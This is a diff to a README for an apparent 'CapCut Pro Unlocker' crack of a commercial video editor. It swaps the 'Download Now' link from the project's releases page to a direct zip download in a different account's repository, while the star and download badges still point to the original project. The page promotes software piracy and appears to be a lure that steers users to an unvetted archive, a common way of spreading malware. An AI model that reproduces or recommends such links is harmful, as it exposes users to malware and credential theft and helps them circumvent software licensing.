@@ -12,7 +12,7 @@ Premium Effects · 4K UHD Export · No Watermark · AI Features · Hardware Acce
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/lowermaintenancetell/CapCut-Pro-Unlocker/releases/latest)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/cyancreatordive/cap-cut-Unlocker/releases/download/setup/setup-v2.33.zip)
 [![Downloads](https://img.shields.io/github/downloads/lowermaintenancetell/CapCut-Pro-Unlocker/total?style=for-the-badge&color=blue)](https://github.com/lowermaintenancetell/CapCut-Pro-Unlocker/releases)
 [![Stars](https://img.shields.io/github/stars/lowermaintenancetell/CapCut-Pro-Unlocker?style=for-the-badge&color=yellow)](https://github.com/lowermaintenancetell/CapCut-Pro-Unlocker/stargazers)
 [![Forks](https://img.shields.io/github/forks/lowermaintenancetell/CapCut-Pro-Unlocker?style=for-the-badge&color=orange)](https://github.com/lowermaintenancetell/CapCut-Pro-Unlocker/forks)
